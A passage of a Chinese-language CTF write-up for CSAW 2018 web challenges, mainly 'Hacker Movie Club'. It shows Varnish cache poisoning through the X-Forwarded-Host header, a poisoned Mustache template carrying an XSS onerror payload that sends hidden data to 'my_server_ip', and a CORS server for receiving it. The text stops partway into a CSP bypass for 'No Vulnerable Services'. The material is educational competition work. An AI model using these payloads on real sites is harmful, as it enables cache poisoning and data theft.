class="line"><span class="hljs-javascript">    <span class="hljs-built_in">window</span>.loaded_recapcha = <span class="hljs-literal">true</span>;</span></span><br><span class="line"><span class="hljs-undefined">&#125;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">window</span>.loaded_mustache = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">window</span>.loaded_mustache = <span class="hljs-literal">true</span>;</span></span><br><span class="line"><span class="hljs-undefined">&#125;</span></span><br><span class="line"><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/cdn.js"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit'</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;其中的<code>/cdn.js</code>作用是加上<code>X-Forwarded-Host</code>头去加载上面两个脚本。<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// cdn.js</span></span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> t <span class="hljs-keyword">of</span> <span class="hljs-built_in">document</span>.head.children) &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (t.tagName !== <span class="hljs-string">'SCRIPT'</span>)</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> &#123; cdn, src &#125; = t.dataset;</span><br><span class="line">    <span class="hljs-keyword">if</span> (cdn === <span class="hljs-literal">undefined</span> || src === <span class="hljs-literal">undefined</span>)</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    fetch(<span class="hljs-string">`//<span class="hljs-subst">$&#123;cdn&#125;</span>/cdn/<span class="hljs-subst">$&#123;src&#125;</span>`</span>,&#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="hljs-string">'X-Forwarded-Host'</span>:cdn</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    ).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.blob()).then(<span class="hljs-function"><span class="hljs-params">b</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">let</span> u = URL.createObjectURL(b);</span><br><span class="line">        <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'script'</span>);</span><br><span class="line">        s.src = u;</span><br><span class="line">        <span class="hljs-built_in">document</span>.head.appendChild(s);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;主页面上还有一个<code>report</code>的功能，一般看到这个一般都会出现XSS利用，但是这道题中并没有输入交互，所以XSS的利用方式还有些不同。<br><br>&emsp;&emsp;app.js如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// app.js</span></span><br><span class="line"><span class="hljs-keyword">var</span> token = <span class="hljs-literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">Promise</span>.all([</span><br><span class="line">    fetch(<span class="hljs-string">'/api/movies'</span>).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.json()),</span><br><span class="line">    fetch(<span class="hljs-string">`//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst`</span>).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.text()),</span><br><span class="line">    <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.loaded_recapcha === <span class="hljs-literal">true</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> resolve();</span><br><span class="line">        <span class="hljs-built_in">window</span>.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.loaded_mustache === <span class="hljs-literal">true</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> resolve();</span><br><span class="line">        <span class="hljs-built_in">window</span>.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(<span class="hljs-function">(<span class="hljs-params">[user, view]</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="hljs-string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="hljs-string">'dark'</span>,</span><br><span class="line">        callback: <span class="hljs-function"><span class="hljs-params">t</span>=&gt;</span> &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'report'</span>).disabled = <span class="hljs-literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="hljs-keyword">let</span> hidden = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'report'</span>).onclick = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (hidden) &#123;</span><br><span class="line">          <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"captcha"</span>).parentElement.style.display=<span class="hljs-string">'block'</span>;</span><br><span class="line">          <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'report'</span>).disabled = <span class="hljs-literal">true</span>;</span><br><span class="line">          hidden = <span class="hljs-literal">false</span>;</span><br><span class="line">          <span class="hljs-keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="hljs-string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="hljs-string">'POST'</span>,</span><br><span class="line">            body: <span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">token</span>:token&#125;)</span><br><span class="line">        &#125;).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.json()).then(<span class="hljs-function"><span class="hljs-params">j</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (j.success) &#123;</span><br><span class="line">                <span class="hljs-comment">// The admin is on her way to check the page</span></span><br><span class="line">                alert(<span class="hljs-string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="hljs-string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="hljs-string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;main.mst下载后发现是模板文件。<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span></span><br><span class="line">Hacker Movie Club</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;#admin&#125;&#125;</span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header admin"</span>&gt;</span></span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;/admin&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"movies"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"> <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Year<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Length<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">  &#123;&#123;^admin_only&#125;&#125;</span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; length &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">  &#123;&#123;/admin_only&#125;&#125;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"captcha"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"captcha"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"report"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"report"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;初期的一个探索并没有发现什么有价值的东西，所以我们可以考虑对每个请求包进行分析。<br><br>&emsp;&emsp;在<code>/api/movies</code>响应的body中看到了一个只能由admin查看的项：<br><div align="center"><br>    <img src="/images/posts/csaw/18.png"><br></div><br>&emsp;&emsp;当我们把它通过抓包改成<code>false</code>时，可以发现：<br><div align="center"><br>    <img src="/images/posts/csaw/19.png"><br></div><br><div align="center"><br>    <img src="/images/posts/csaw/20.png"><br></div><p>&emsp;&emsp;可以看到，隐藏的项就出来了，所以我们的目的就明确了，但是我们没有太多可以交互的地方，所以还需要找突破点。</p><p>&emsp;&emsp;观察后发现每个响应头都有：<br><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">...</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Varnish: 157274709</span><br><span class="line">Age: 0</span><br><span class="line">Via: 1.1 varnish-v4</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;去了解了下<code>varnish</code>，发现它是一个<code>反向代理</code>中的<code>缓存服务</code>程序。</p><blockquote><p>如果来自Apache的响应是可缓存的，Varnish会将其存储以便更快地响应未来的请求。</p></blockquote><p>&emsp;&emsp;varnish详细的请求头可以在<a href="https://docs.acquia.com/acquia-cloud/performance/varnish/" target="_blank">这里</a>找到。</p><p>&emsp;&emsp;所以这里我们需要用到一种叫<code>Web Cache Poisoning</code>（<code>web缓存污染</code>）的利用方法，这个跟<code>Cache Poisoning</code>（又称DNS污染）是不一样的东西。</p><p>&emsp;&emsp;参考链接：</p><p>&emsp;&emsp;<a href="https://xz.aliyun.com/t/2585" target="_blank">中文版-实战Web缓存中毒</a></p><p>&emsp;&emsp;<a href="https://portswigger.net/blog/practical-web-cache-poisoning" target="_blank">英文原版</a></p><p>&emsp;&emsp;这里我们可以重点关注<code>DOM Poisoning</code>（DOM污染）。</p><p>&emsp;&emsp;另一个需要先了解的事情是<code>X-Forwarded-Host</code>的作用，详情可参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-Host" target="_blank">这里</a>。</p><blockquote><p>X-Forwarded-Host (XFH) 是一个事实上的标准首部，用来确定客户端发起的请求中使用  Host  指定的初始域名。<br>反向代理（如负载均衡服务器、CDN等）的域名或端口号可能会与处理请求的源头服务器有所不同，在这种情况下，X-Forwarded-Host 可以用来确定哪一个域名是最初被用来访问的。</p></blockquote><p>&emsp;&emsp;语法：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Host: &lt;host&gt;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上面这些归结起来就是<code>当服务器进行缓存时它会将客户端的请求转发到XFH指定的host上去。</code></p><p>&emsp;&emsp;现在再回过头看看我们已有的资料。我们得知<code>main.mst</code>是模板文件，它会利用<code></code>等对admin身份进行判断，如果我们能够劫持掉这个模板文件，使她绕过admin就可以获得到完整的项。</p><p>&emsp;&emsp;我们先来找到<code>main.mst</code>缓存的最大时间(<code>max-age</code>)，我们可以带着<code>X-Forwarded-Host</code>不停的请求<code>/cdn/app.js</code>，如果<code>fetch(&#39;//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst&#39;)</code>能被我们控制到<code>fetch(&#39;my_server/cdn/main.mst&#39;)</code>上就成功的完成了劫持。</p><p>&emsp;&emsp;我们可以使用下面的脚本验证一下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">X_Forwarded_Host = <span class="hljs-string">'1.2.3.4'</span> </span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    resp = requests.get(<span class="hljs-string">"http://4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/app.js"</span>, headers=&#123;<span class="hljs-string">'X-Forwarded-Host'</span>: X_Forwarded_Host&#125;)</span><br><span class="line">    <span class="hljs-keyword">print</span> resp.headers</span><br><span class="line">    <span class="hljs-keyword">if</span> X_Forwarded_Host <span class="hljs-keyword">in</span> resp.text:</span><br><span class="line">        <span class="hljs-keyword">print</span> resp.text</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;结果如下：</p><p><div align="center"><br>    <img src="/images/posts/csaw/21.png"><br></div></p><p><div align="center"><br>    <img src="/images/posts/csaw/22.png"><br></div><br>&emsp;&emsp;可以看到我们成功的通过<code>web缓存污染</code>劫持了模板文件。接着我们再构造好模板文件，然后让admin去访问就可以拿到flag了。<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span></span><br><span class="line">Hacker Movie Club</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header admin"</span>&gt;</span></span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"movies"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"> <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Year<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Length<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; length &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"captcha"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"captcha"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"report"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"report"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"fetch('http://my_server_ip/'+'&#123;&#123;#movies&#125;&#125;&#123;&#123; name &#125;&#125;&#123;&#123;/movies&#125;&#125;')"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;如果你直接访问会出现一个<code>跨域资源共享</code>（CORS）的问题，如下：</p><p><div align="center"><br>    <img src="/images/posts/csaw/23.png"><br></div><br>&emsp;&emsp;它要求服务器回应的头信息要包含<code>Access-Control-Allow-Origin</code>字段，如果你不想配置Apache或者Nginx，那你可以使用下面这个建议的python web server。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-comment"># Python 3</span></span><br><span class="line">    <span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="hljs-keyword">as</span> test_orig</span><br><span class="line">    <span class="hljs-keyword">import</span> sys</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span> <span class="hljs-params">(*args)</span>:</span></span><br><span class="line">        test_orig(*args, port=int(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">8000</span>)</span><br><span class="line"><span class="hljs-keyword">except</span> ImportError: <span class="hljs-comment"># Python 2</span></span><br><span class="line">    <span class="hljs-keyword">from</span> BaseHTTPServer <span class="hljs-keyword">import</span> HTTPServer, test</span><br><span class="line">    <span class="hljs-keyword">from</span> SimpleHTTPServer <span class="hljs-keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CORSRequestHandler</span> <span class="hljs-params">(SimpleHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">end_headers</span> <span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self.send_header(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, <span class="hljs-string">'*'</span>)</span><br><span class="line">        SimpleHTTPRequestHandler.end_headers(self)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    test(CORSRequestHandler, HTTPServer)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;开启后就能在日志输出中得到flag：</p><p><div align="center"><br>    <img src="/images/posts/csaw/24.png"><br></div><br>&emsp;&emsp;flag：flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es}</p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>&emsp;&emsp;<a href="https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/" target="_blank" rel="noopener">https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/</a></p><h3 id="No-Vulnerable-Services"><a href="#No-Vulnerable-Services" class="headerlink" title="No Vulnerable Services"></a>No Vulnerable Services</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.</span><br><span class="line"></span><br><span class="line">Be #unhackable.™</span><br><span class="line"></span><br><span class="line">http://no.vulnerable.services/</span><br></pre></td></tr></table></figure><p><div align="center"><br>    <img src="/images/posts/csaw/25.png"><br></div><br>&emsp;&emsp;参考writeup：<a href="https://ctftime.org/writeup/11205" target="_blank">https://ctftime.org/writeup/11205</a></p><p>&emsp;&emsp;进入网站可以发现使用CSP，策略如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/; style-src *.no.vulnerable.services https://fonts.googleapis.com/ &apos;unsafe-inline&apos;; img-src *.no.vulnerable.services; font-src *.no.vulnerable.services https://fonts.gstatic.com/; frame-src https://www.google.com/</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;可以使用Google的<a href="https://csp-evaluator.withgoogle.com/" target="_blank">CSP检测工具</a>检测一下：</p><p><div align="center"><br>    <img src="/images/posts/csaw/26.png"><br></div><br>&emsp;&emsp;发现<code>script-src</code>可能存在问题，但题目环境中我们并没有能够控制<code>src</code>的地方，所以再回头看看还有什么发现。</p><p>&emsp;&emsp;页面的最底下发现了一个奇怪的域名</p><p><div align="center"><br>    <img src="/images/posts/csaw/27.png"><br></div><br>&emsp;&emsp;访问后发现跟主域名(<a href="http://no.vulnerable.services/index.php)页面一样。我们ping一下`no.vulnerable.services`发现解析地址是：`216.165.2.40`，而他的16进制表示就是`0xd8a50228`。如果不知道怎么转换可以使用" target="_blank" rel="noopener">http://no.vulnerable.services/index.php)页面一样。我们ping一下`no.vulnerable.services`发现解析地址是：`216.165.2.40`，而他的16进制表示就是`0xd8a50228`。如果不知道怎么转换可以使用</a><a href="https://www.browserling.com/tools/ip-to-hex" target="_blank">这个工具</a>。</p><p>&emsp;&emsp;我们尝试改成对我们服务器的代理，如http://{hexip}.ip.no.vulnerable.services。</p><p><div align="center"><br>    <img 